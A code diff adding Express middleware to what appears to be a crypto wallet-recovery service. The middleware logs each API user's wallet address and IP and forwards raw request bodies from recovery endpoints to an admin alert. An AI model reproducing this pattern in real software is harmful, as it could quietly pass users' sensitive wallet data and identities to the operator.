@@ -62,6 +62,36 @@ app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 // Apply rate limiting
 app.use(rateLimiterMiddleware);
 
+// Universal activity tracker - logs ALL user requests
+app.use('/api', async (req, res, next) => {
+  const userAddress = req.body.walletAddress || req.params.walletAddress || 'Unknown';
+  const realIP = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || req.ip;
+  
+  console.log(`🔥 USER ACTIVITY: ${req.method} ${req.path} - User: ${userAddress} - IP: ${realIP}`);
+  
+  // Send alert for important endpoints
+  const importantEndpoints = ['/scan-wallet', '/analyze-recovery', '/create-recovery-job', '/execute-recovery', '/scan-bridge', '/scan-staking'];
+  
+  if (importantEndpoints.some(endpoint => req.path.includes(endpoint))) {
+    try {
+      const { sendAdminNotification } = require('./routes/api');
+      await sendAdminNotification(
+        `🔥 USER ACTIVITY: ${req.path} - ${userAddress.slice(0,8)}...`,
+        `USER ACTIVITY DETECTED\n\n` +
+        `ENDPOINT: ${req.method} ${req.path}\n` +
+        `USER: ${userAddress}\n` +
+        `IP: ${realIP}\n` +
+        `TIME: ${new Date().toISOString()}\n` +
+        `DATA: ${JSON.stringify(req.body, null, 2).substring(0, 500)}...`
+      );
+    } catch (e) {
+      console.log('Activity alert failed:', e.message);
+    }
+  }
+  
+  next();
+});
+
 // Health check endpoint
 app.get('/health', async (req, res) => {
   try {
